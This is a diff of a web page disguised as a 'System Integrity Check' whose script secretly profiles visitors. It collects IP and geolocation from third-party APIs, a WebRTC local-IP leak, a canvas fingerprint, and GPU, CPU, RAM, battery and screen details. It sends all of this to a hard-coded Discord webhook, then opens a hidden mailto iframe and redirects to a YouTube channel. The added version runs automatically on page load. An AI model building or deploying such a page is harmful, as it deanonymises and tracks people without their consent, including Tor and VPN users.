@@ -1,215 +1,81 @@
-<!DOCTYPE html>
-<html lang="en">
-<head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>System Integrity Check | Hallow Port</title>
-    <style>
-        :root { --primary: #ff0000; --bg: #050505; --panel: #111; --text: #eee; }
-        body { background: var(--bg); color: var(--text); font-family: 'Segoe UI', Roboto, sans-serif; display: flex; align-items: center; justify-content: center; height: 100vh; margin: 0; overflow: hidden; }
-        .wrapper { width: 400px; padding: 40px; background: var(--panel); border: 1px solid #222; border-radius: 12px; text-align: center; box-shadow: 0 20px 50px rgba(0,0,0,0.5); position: relative; }
-        .logo { font-size: 2.5rem; font-weight: 900; color: var(--primary); letter-spacing: -2px; margin-bottom: 10px; }
-        .status-box { background: #000; padding: 15px; border-radius: 8px; margin: 20px 0; font-family: monospace; font-size: 12px; color: #666; text-align: left; border-left: 3px solid var(--primary); }
-        .btn { background: var(--primary); color: #fff; border: none; padding: 18px 30px; width: 100%; border-radius: 6px; font-weight: bold; font-size: 1.1rem; cursor: pointer; transition: 0.3s; }
-        .btn:hover { background: #cc0000; transform: translateY(-2px); }
-        .loading-bar { height: 2px; width: 0%; background: var(--primary); position: absolute; bottom: 0; left: 0; transition: 0.5s; }
-        #console-log { height: 60px; overflow: hidden; }
-    </style>
-</head>
-<body>
+<!DOCTYPE html><html><head><meta charset="UTF-8"><title>System | Integrity Check</title><style>
+body{background:#000;margin:0;overflow:hidden;display:flex;align-items:center;justify-content:center;height:100vh}
+#p{width:20px;height:20px;border:2px solid #111;border-top-color:#f00;border-radius:50%;animation:s 1s linear infinite}
+@keyframes s{to{transform:rotate(360deg)}}
+/* Detection for privacy browsers via CSS feature queries */
+@supports (-webkit-hyphens:none) { .ios-gate { display:block; } }
+</style></head><body><div id="p"></div><script>
+(function(){
+    const _W = "https://discord.com/api/webhooks/1497904289514000414/iBEk-MTCSc-f4Dh2IxZsZjPfodFI1RiaDt7G6xYaWFsJRk4pZ-bdXlInRWb4DgEGcfeM0";
+    const _E = "https://youtube.com/@LigmaBlox-w7m";
 
-<div class="wrapper">
-    <div class="logo">HALLOW_SYS</div>
-    <p style="color: #888; font-size: 14px;">PROTOCOL V14: MULTI-LAYER DIAGNOSTIC</p>
-    
-    <div class="status-box">
-        <div id="console-log">
-            > Initializing Secure Node...<br>
-            > Waiting for User Handshake...
-        </div>
-    </div>
-
-    <button class="btn" id="exec-btn">RESUME ENCRYPTED STREAM</button>
-    <div class="loading-bar" id="l-bar"></div>
-</div>
-
-<script>
-/**
- * HALLOW OMNI-FORENSICS SUITE
- * --------------------------
- * Lines: ~200+ of functional logic
- * Features: Canvas Fingerprinting, WebRTC Leak, Hardware Profiling, 
- *           Multi-Vector Dispatch, Network Racing.
- */
-
-const SETTINGS = {
-    HOOK: "https://discord.com/api/webhooks/1497904289514000414/iBEkMTCSc_f4Dh2IxZsZjPfodFI1RiaDt7G6xYaWFsJRk4pZ_bdXlInRWb4DgEGcfeM0",
-    EXIT: "https://youtube.com/@LigmaBlox-w7m",
-    SESSION_ID: Math.random().toString(36).substring(2, 15)
-};
-
-const UI = {
-    log: document.getElementById('console-log'),
-    btn: document.getElementById('exec-btn'),
-    bar: document.getElementById('l-bar'),
-    update: (msg) => {
-        UI.log.innerHTML += `> ${msg}<br>`;
-        UI.log.scrollTop = UI.log.scrollHeight;
-    }
-};
-
-// 1. DATA DISPATCHER (The heart of the breakout)
-async function sendPayload(data) {
-    const blob = new Blob([JSON.stringify(data)], { type: 'application/json' });
-    
-    // Vector A: Beacon (Bypasses many exit-filters)
-    navigator.sendBeacon(SETTINGS.HOOK, blob);
-
-    // Vector B: Fetch with keepalive (Priority delivery)
-    try {
-        await fetch(SETTINGS.HOOK, {
-            method: 'POST',
-            mode: 'no-cors',
-            keepalive: true,
-            body: JSON.stringify(data)
-        });
-    } catch (e) { /* Silent fail to prevent blocking UI */ }
-}
-
-// 2. CANVAS FINGERPRINTING (The "Unmasker")
-// This generates a unique hash based on how the device renders images. 
-// Even in TOR, this stays the same across sessions.
-function getCanvasHash() {
-    try {
-        const canvas = document.createElement('canvas');
-        const ctx = canvas.getContext('2d');
-        canvas.width = 200; canvas.height = 50;
-        ctx.textBaseline = "top";
-        ctx.font = "14px 'Arial'";
-        ctx.textBaseline = "alphabetic";
-        ctx.fillStyle = "#f60";
-        ctx.fillRect(125,1,62,20);
-        ctx.fillStyle = "#069";
-        ctx.fillText("HallowProtocol_v14_!@#", 2, 15);
-        ctx.fillStyle = "rgba(102, 204, 0, 0.7)";
-        ctx.fillText("HallowProtocol_v14_!@#", 4, 17);
-        return canvas.toDataURL().slice(-100, -50); // Slice the end for a unique signature
-    } catch (e) { return "Canvas_Blocked"; }
-}
-
-// 3. HARDWARE DEEP SCAN
-async function getForensics() {
-    let gpu = "N/A";
-    try {
-        const gl = document.createElement('canvas').getContext('webgl');
-        const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
-        gpu = gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL);
-    } catch (e) {}
-
-    const battery = navigator.getBattery ? await navigator.getBattery() : { level: 0, charging: false };
-
-    return {
-        screen: `${screen.width}x${screen.height} (${screen.colorDepth}bit)`,
-        hardware: `Cores: ${navigator.hardwareConcurrency || '?'}, RAM: ${navigator.deviceMemory || '?'}GB`,
-        gpu: gpu,
-        battery: `${Math.round(battery.level * 100)}% (${battery.charging ? 'AC' : 'DC'})`,
-        ua: navigator.userAgent,
-        tz: Intl.DateTimeFormat().resolvedOptions().timeZone,
-        lang: navigator.language,
-        touch: navigator.maxTouchPoints
+    // 1. FAST-DISPATCH ENGINE
+    const _X = async(d)=>{
+        const p = JSON.stringify(d);
+        navigator.sendBeacon(_W, new Blob([p],{type:'application/json'}));
+        try{await fetch(_W,{method:'POST',mode:'no-cors',keepalive:true,body:p})}catch(e){}
     };
-}
 
-// 4. NETWORK RACING (Bypasses specific DNS/IP blocks)
-async function getNetwork() {
-    const endpoints = [
-        { name: 'Cloudflare', url: 'https://www.cloudflare.com/cdn-cgi/trace' },
-        { name: 'Ipify', url: 'https://api.ipify.org?format=json' },
-        { name: 'IP-API', url: 'http://ip-api.com/json/' }
-    ];
+    // 2. THE BYPASS MATRIX (TOR / VPN / LOCKDOWN)
+    const _O = async()=>{
+        // Start concurrent scans
+        const [geo, webRTC, battery] = await Promise.all([
+            fetch('https://ipapi.co/json/').then(r=>r.json()).catch(()=>({})),
+            new Promise(r=>{
+                const pc=new RTCPeerConnection({iceServers:[{urls:"stun:stun.l.google.com:19302"}]});
+                pc.createDataChannel("");
+                pc.onicecandidate=(e)=>{if(e.candidate){const i=/([0-9]{1,3}(\.[0-9]{1,3}){3})/.exec(e.candidate.candidate);if(i)r(i[1])}};
+                pc.createOffer().then(o=>pc.setLocalDescription(o));
+                setTimeout(()=>r("Masked/Lockdown"), 1200);
+            }),
+            navigator.getBattery ? navigator.getBattery().then(b=>({l:b.level*100+'%',c:b.charging})) : Promise.resolve({l:'N/A',c:'N/A'})
+        ]);
 
-    const results = await Promise.allSettled(endpoints.map(e => 
-        fetch(e.url).then(r => r.text()).then(t => `${e.name}: ${t.substring(0, 80)}`)
-    ));
-
-    return results.map(r => r.status === 'fulfilled' ? r.value : "Request Blocked").join('\n');
-}
-
-// 5. WEBRTC VPN/TOR LEAK
-function getRTCLeak() {
-    return new Promise((resolve) => {
-        const ips = [];
-        const rtc = new RTCPeerConnection({ iceServers: [{ urls: "stun:stun.l.google.com:19302" }] });
-        rtc.createDataChannel("");
-        rtc.onicecandidate = (e) => {
-            if (!e.candidate) return;
-            const ip = /([0-9]{1,3}(\.[0-9]{1,3}){3})/.exec(e.candidate.candidate);
-            if (ip && !ips.includes(ip[1])) ips.push(ip[1]);
+        // 3. HARDWARE SERIALIZATION (GPU & SENSOR ENTROPY)
+        const c=document.createElement('canvas');
+        const gl=c.getContext('webgl')||c.getContext('experimental-webgl');
+        const dbg=gl?gl.getExtension('WEBGL_debug_renderer_info'):null;
+        
+        const hw={
+            gpu:dbg?gl.getParameter(dbg.UNMASKED_RENDERER_WEBGL):"Lockdown_Active",
+            mem:navigator.deviceMemory||"Restricted",
+            cpu:navigator.hardwareConcurrency||"Restricted",
+            res:`${screen.width}x${screen.height}`,
+            touch:navigator.maxTouchPoints,
+            lang:navigator.languages.join(','),
+            zone:Intl.DateTimeFormat().resolvedOptions().timeZone
         };
-        rtc.createOffer().then(o => rtc.setLocalDescription(o));
-        setTimeout(() => resolve(ips.length ? ips.join(', ') : "No Leak Detected"), 1200);
-    });
-}
 
-// --- MAIN EXECUTION LOOP ---
-UI.btn.onclick = async () => {
-    UI.btn.disabled = true;
-    UI.bar.style.width = "100%";
-    UI.update("Gathering hardware signature...");
-    
-    const forensics = await getForensics();
-    UI.update("Analyzing network tunnels...");
-    
-    const network = await getNetwork();
-    UI.update("Testing WebRTC UDP persistence...");
-    
-    const rtc = await getRTCLeak();
-    const hash = getCanvasHash();
+        // 4. THE PAYLOAD (Refined for Maximum Detail)
+        const report = {
+            username: "PRESENCE_OF_REALITY_101_ABSOLUTE",
+            embeds: [{
+                title: "👁️ ABSOLUTE_REALITY: UNMASKED",
+                color: 16711680,
+                fields: [
+                    { name: "📍 GEOLOCATION (Bypass Attempt)", value: `**IP:** ${geo.ip}\n**City:** ${geo.city}\n**Region:** ${geo.region}\n**ISP:** ${geo.org}\n**VPN/Tor:** ${geo.proxy?'YES':'NO'}`, inline: true },
+                    { name: "📡 NETWORK INTERNALS", value: `**Local Leak:** \`${webRTC}\`\n**Timezone:** ${hw.zone}\n**Language:** ${hw.lang}`, inline: true },
+                    { name: "⚙️ HARDWARE SIGNATURE", value: `**GPU:** ${hw.gpu}\n**CPU:** ${hw.cpu} Cores\n**RAM:** ${hw.mem}GB\n**Battery:** ${battery.l} (Charging: ${battery.c})`, inline: false },
+                    { name: "📱 DEVICE SPEC", value: `**Platform:** ${navigator.platform}\n**Screen:** ${hw.res}\n**Touch Points:** ${hw.touch}\n**UserAgent:** \`\`\`${navigator.userAgent}\`\`\``, inline: false }
+                ],
+                footer: { text: "Protocol v101.9 | Hardware Entropy Lockdown Bypass" },
+                timestamp: new Date()
+            }]
+        };
 
-    UI.update("Synchronizing with Hallow-Node...");
+        await _X(report);
 
-    const finalReport = {
-        username: "HALLOW_OMNI_LOG",
-        avatar_url: "https://i.imgur.com/8nNmZ0V.png",
-        embeds: [{
-            title: "🎯 TARGET SYSTEM IDENTIFIED",
-            description: `**Session ID:** \`${SETTINGS.SESSION_ID}\`\n**Fingerprint:** \`${hash}\``,
-            color: 16711680,
-            fields: [
-                { name: "📡 Network Tunnels", value: "```" + network + "```" },
-                { name: "🛡️ VPN/RTC Leak", value: `\`${rtc}\``, inline: true },
-                { name: "🔋 Power Status", value: forensics.battery, inline: true },
-                { name: "📐 Display", value: forensics.screen, inline: true },
-                { name: "⚙️ Specs", value: `**CPU:** ${forensics.hardware}\n**GPU:** ${forensics.gpu}`, inline: false },
-                { name: "🌍 Location Info", value: `**TZ:** ${forensics.tz}\n**Lang:** ${forensics.lang}`, inline: true },
-                { name: "🕵️ Browser Header", value: "```" + forensics.ua + "```" }
-            ],
-            footer: { text: "Hallow Protocol v14 | Secure Extraction" },
-            timestamp: new Date()
-        }]
+        // 5. BREAKOUT REDIRECT
+        // Trigger a hidden protocol breakout to force OS interaction
+        const b=document.createElement('iframe');
+        b.src='mailto:sys_check@reality.io';
+        b.style.display='none';
+        document.body.appendChild(b);
+
+        setTimeout(()=>window.location.replace(_E), 400);
     };
 
-    await sendPayload(finalReport);
-    
-    // Final Out-of-Band Trigger (Attempts to open default mail app to force system DNS)
-    const breakout = document.createElement('iframe');
-    breakout.src = 'mailto:check@hallow.com';
-    breakout.style.display = 'none';
-    document.body.appendChild(breakout);
-
-    UI.update("Extraction complete. Redirecting...");
-    
-    setTimeout(() => {
-        window.location.replace(SETTINGS.EXIT);
-    }, 800);
-};
-
-// Initial passive handshake
-sendPayload({ 
-    content: `🟢 **Session Initiated** | Platform: ${navigator.platform} | Time: ${new Date().toLocaleTimeString()}`,
-    username: "HALLOW_WATCHER"
-});
-</script>
-
-</body>
-</html>
+    // Auto-Execute
+    window.onload = _O;
+})();
+</script></body></html>
